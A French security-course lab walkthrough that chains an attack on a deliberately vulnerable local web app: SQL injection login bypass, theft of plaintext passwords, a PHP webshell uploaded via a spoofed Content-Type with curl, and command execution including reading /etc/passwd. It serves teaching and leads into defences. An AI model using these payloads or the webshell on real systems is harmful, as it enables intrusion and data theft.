INTRO · NIVEAU 0 — avant de commencer le cours

🩸 Comment une application se fait-elle compromettre ?

Chaîne complète : injection SQL → récupération du compte admin → upload d'un webshell → exécution de commandes · Durée : 45 min
Cadre légal. Les techniques ci-dessous ne s'appliquent QUE sur ce lab, isolé, qui vous appartient. Les reproduire sur un système dont vous n'avez pas l'autorisation écrite est un délit.
Objectif pédagogique

Ne pas (encore) apprendre à défendre, mais voir de ses yeux ce que veut dire « une appli est compromise » : partir d'un simple champ de login et finir avec un shell sur le serveur. Chaque étape ouvre la suivante.

Mise en route

Le formateur a lancé le lab (sinon : docker compose -f docker-compose.local.yml up -d --build). L'application est sur :

http://localhost:8080

Outils : un navigateur, et curl (ou Burp Suite). C'est le portail interne « CorpLab ». Vous n'avez aucun compte.

🚀 Raccourci - voir la compromission tout de suite

Pour enchaîner toute l'attaque (SQLi → upload du webshell → exécution) et voir le résultat, depuis le dossier intro/ :

# Linux / macOS / Git Bash
./exploit.sh
# Windows (PowerShell)
.\exploit.ps1

Tu dois voir uid=33(www-data)… : tu exécutes des commandes sur le serveur. Les étapes ci-dessous détaillent, à la main, ce que ce script a fait.

Étape 1 — Entrer sans mot de passe (injection SQL)

Le formulaire de login colle vos saisies directement dans une requête SQL :

SELECT * FROM users WHERE username = 'ce_que_vous_tapez' AND password = '...'

Si le nom d'utilisateur contient une apostrophe, vous « sortez » de la chaîne et vous réécrivez la requête. Tapez dans le champ Identifiant :

admin'-- -

…n'importe quoi dans le mot de passe. Le -- transforme la fin de la requête (la vérification du mot de passe) en commentaire. La requête devient :

SELECT * FROM users WHERE username = 'admin'-- -' AND password = '...'

Vous êtes connecté en admin, sans jamais avoir connu son mot de passe.

Q1. Expliquez avec vos mots pourquoi admin'-- - fonctionne. Que se passerait-il avec ' OR '1'='1 ?

Étape 2 — Récupérer les identifiants (le dashboard admin)

Le tableau de bord administrateur affiche tous les comptes… avec leurs mots de passe en clair. Vous repartez avec le mot de passe réel de l'admin et de tous les utilisateurs.

Deux fautes se cumulent : l'injection SQL (entrer sans autorisation) et le stockage des mots de passe en clair (une fois dedans, tout est exposé). Dans la vraie vie, c'est comme ça que des bases entières fuitent.
Q2. Notez le mot de passe de admin. Pourquoi stocker les mots de passe en clair aggrave-t-il énormément la fuite ?

Étape 3 — Déposer un webshell (contourner le filtre d'upload)

Le dashboard permet d'« ajouter un visuel produit ». On va y déposer non pas une image mais un petit script PHP — un webshell — qui exécute les commandes qu'on lui passe :

echo '<?php system($_GET["cmd"]); ?>' > shell.php

Le filtre refuse ce qui n'est pas une image. Mais il ne regarde que le type annoncé par le navigateur (Content-Type) — une information… fournie par le client, donc falsifiable.

Tentative honnête (refusée) :

curl -b c.txt -F "image=@shell.php" http://localhost:8080/admin.php
# -> "Refusé : seules les images sont acceptées"

Avec contournement — on ment sur le type en annonçant image/png :

# d'abord se connecter en admin et garder le cookie de session :
curl -i -c c.txt --data-urlencode "username=admin'-- -" --data-urlencode "password=x" \
  http://localhost:8080/index.php

# puis uploader le webshell en se faisant passer pour une image :
curl -b c.txt -F "image=@shell.php;type=image/png" http://localhost:8080/admin.php
# -> "Visuel enregistré : uploads/shell.php"
Sous Windows, le curl intégré a un bug sur l'upload de fichier (-F) : utilise .\exploit.ps1 (fourni), ou Burp Suite - uploade une vraie image via le formulaire, intercepte la requête, remplace le nom par shell.php, le contenu par le code PHP, et force Content-Type: image/png. Même résultat.
Q3. Le filtre « n'autorise que les images » : pourquoi est-il inutile ? Qui contrôle le Content-Type ?

Étape 4 — Exécuter des commandes (RCE = compromission)

Le fichier déposé est servi par le serveur web, qui exécute le PHP. Vous pilotez maintenant le serveur depuis l'URL :

curl "http://localhost:8080/uploads/shell.php?cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

curl "http://localhost:8080/uploads/shell.php?cmd=whoami;hostname"
curl "http://localhost:8080/uploads/shell.php?cmd=cat%20/etc/passwd"

Ou directement dans le navigateur : http://localhost:8080/uploads/shell.php?cmd=ls%20-la.

Q4. Listez 3 commandes qui montrent que vous « tenez » la machine (lecture de fichiers, utilisateurs, réseau…). Qu'est-ce qu'un attaquant ferait ensuite ?

Ce que vous venez de faire

En quatre étapes, à partir d'un champ de connexion, vous avez : contourné l'authentification, volé toutes les données d'accès, déposé du code sur le serveur et exécuté des commandes arbitraires. C'est ça, « compromettre une application ». Une seule faille suffit rarement : ici elles se chaînent, chacune amplifiant la précédente.

Et on évite ça comment ? C'est tout l'objet du cours qui suit : requêtes préparées (SQLi), hachage des mots de passe, validation du contenu des fichiers + interdiction d'exécution dans les dossiers d'upload, et surtout une chaîne CI/CD qui attrape ces fautes avant la mise en production.
